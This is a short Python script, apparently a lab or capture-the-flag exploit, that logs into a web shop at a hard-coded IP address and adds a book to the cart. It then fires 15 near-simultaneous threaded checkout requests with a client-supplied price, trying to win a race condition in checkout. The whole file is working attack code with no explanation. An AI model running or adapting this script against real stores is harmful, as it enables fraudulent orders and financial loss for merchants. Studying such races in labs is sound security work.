import time
import requests
import threading
# Start the session
request = requests.Session()
# Step#1
url = 'http://34.143.208.198/login.php'
# Step#2
url2 = 'http://34.143.208.198/cart.php'
# Step#3
url3 = 'http://34.143.208.198/additem.php'
# Step#4
url4 = 'http://34.143.208.198/checkout.php'
payload = {
    'email': 'test@hotmail.com',
    'password': 'test'
}
payload2 = {
    'userid': '1',
    'sum_price': '399'
}
add_to_cart = {
    'item_id': 'A00000001',
    'item_price': '399'
}
#def request_post(req,url3,add_to_cart,url4,data):
def request_post(url4,data):
 req = requests.Session()
 req.post(url,payload)
 return req.post(url4, data)
# Login
s = request.post(url,payload)
# Add book to cart
s2 = request.post(url3,add_to_cart)
for i in range(15):
    time.sleep(0.1)
    threading.Thread(target=request_post, args=(url4,payload2)).start()